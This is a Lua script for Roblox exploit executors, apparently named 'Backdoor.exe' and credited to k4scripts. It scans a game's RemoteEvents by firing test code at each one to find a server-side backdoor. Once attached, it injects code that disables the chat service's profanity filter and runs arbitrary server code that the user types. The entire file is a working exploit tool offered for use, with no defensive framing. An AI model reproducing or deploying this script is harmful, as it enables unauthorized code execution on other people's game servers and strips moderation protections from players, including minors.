local LocalPlayer = game.Players.LocalPlayer
local guiDestination = game.CoreGui.RobloxGui
local salt = "12623546126"

local function notify(text)
	game.StarterGui:SetCore(
		"SendNotification",{
			Title = "Backdoor.exe",
			Text = text,
		}
	)
end

-- Removing dubs
for _, gui in pairs(guiDestination:GetChildren()) do
	if gui:IsA("ScreenGui") and string.match(gui.Name, salt) then
		gui:Destroy()
	end
end


local assetId = "rbxassetid://7062870440"
local GUI = game:GetObjects(assetId)[1]
if syn then syn.protect_gui(GUI) end
GUI.Parent = guiDestination
GUI.Name = salt..tostring(math.random(100000000,1000000000))


local function findObject(name, type)
	 for i, object in pairs(GUI:GetDescendants()) do
		if object.Name == name and object.ClassName == type then return object end
	 end
end

GUI.Main.Active = true
GUI.Main.Draggable = true

-- Top Bar
local closeButton = findObject("Close_Button","ImageButton")
local statusText = findObject("Status","TextLabel")
local statusColor = findObject("Status_Color","Frame")

-- Source Frame
local sourceFrame = findObject("sourceFrame","ScrollingFrame")
local source = findObject("source","TextBox")
local lines = findObject("lines","TextLabel")

-- Source Buttons
local sourceButtons = findObject("Main_Buttons","Frame")
--- Left
local executeButton = findObject("Execute_Button","TextButton")
local clearButton = findObject("Clear_Button","TextButton")
local hideButton = findObject("Hide_Button","TextButton")
--- Right
local scanButton = findObject("Scan_Button","TextButton")
local inviteButton = findObject("Invite_Button","TextButton")


local BackdoorUI = {
	attached = false,
	backdoorRemote = nil,
	scanning = false
}

local function changeUiState()

	local attachColors = {
		["true"] = Color3.fromRGB(95, 185, 47),
		["false"] = Color3.fromRGB(185, 48, 48)
	}
	local attachTexts = {
		["true"] = "Attached",
		["false"] = "Unattached"
	}

	BackdoorUI.attached = not BackdoorUI.attached
	statusColor.BackgroundColor3 = attachColors[tostring(BackdoorUI.attached)]
	statusText.Text = attachTexts[tostring(BackdoorUI.attached)]

	if BackdoorUI.attached == true then
		notify("Backdoor Found")
	end
end
local function stringToInstance(str)
	 -- Credits to the DevForum
	local dir = str
	local segments = dir:split(".")
	local current = game
	for i, v in pairs(segments) do
		 current = current[v]
	end
	return current
end
local function check(vn)
	
	if workspace:FindFirstChild(vn) then
		BackdoorUI.backdoorRemote = stringToInstance(workspace:FindFirstChild(vn).Value)
		
		-- Anti-Censoring
		BackdoorUI.backdoorRemote:FireServer("local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);chatservice.InternalApplyRobloxFilterNewAPI=function(self,sp,mes,textfilcon) return true,false,mes end;chatservice.InternalApplyRobloxFilter=function(self,sp,mes,toname) return mes end")
		notify("Anti-Censoring is ACTIVE")
		
		workspace:FindFirstChild(vn):Destroy()
		return true
	end
end

local function scan()
	if BackdoorUI.scanning == true then return end
	if BackdoorUI.attached == true then changeUiState() end

	BackdoorUI.scanning = true
	statusText.Text = "Scanning"
	local valueName = salt..math.random(100000, 999999)

	for _, testRemote in pairs(game:GetDescendants()) do
		if testRemote.ClassName == "RemoteEvent" and BackdoorUI.attached == false then
			local testScript = "i=Instance.new('StringValue',workspace) i.Name='"..valueName.."' i.Value='"..testRemote:GetFullName().."'"

			if not getgenv().blacklisted or not table.find(getgenv().blacklisted, testRemote:GetFullName()) then
				testRemote:FireServer(testScript)
			end

			if check(valueName) then
				changeUiState()
				return
			end
			game:GetService("RunService").Stepped:Wait()
		end
	end

	 -- Wait for possible server lag
	statusText.Text = "Rechecking"
	wait(1.5)
	if check(valueName) then
		changeUiState()
		return
	end
	
	BackdoorUI.scanning = false
	notify("Failed to find a backdoor")
	statusText.Text = "Failed"
end

local function executeScript()
	local function callback(text)
		if text == "Yes" then
			scan()
			BackdoorUI.backdoorRemote:FireServer(source.Text)
		elseif text == "No" then
			return
		end
	end

	local bf = Instance.new("BindableFunction")
	bf.OnInvoke = callback

	if BackdoorUI.attached == false then
		game.StarterGui:SetCore(
			"SendNotification",{
				Title = "backdoor.exe",
				Text = "You're not attached.\nWould you like to attach now?",
				Callback = bf,
				Button1 = "Yes",
				Button2 = "No"
			}
		)
	else
		BackdoorUI.backdoorRemote:FireServer(source.Text)
	end
end


-- Buttons
closeButton.MouseButton1Click:Connect(function() GUI:Destroy() end)
scanButton.MouseButton1Click:Connect(scan)
executeButton.MouseButton1Click:Connect(executeScript)
clearButton.MouseButton1Click:Connect(function() source.Text = ""  end)
hideButton.MouseButton1Click:Connect(function() sourceFrame.Visible = not sourceFrame.Visible end)
inviteButton.MouseButton1Click:Connect(function() setclipboard("6HndYgC") end)

--	k4scripts
--	.------.
--	|4.--. |
--	| :/\: |
--	| :\/: |
--	| '--'4|
--	`------'
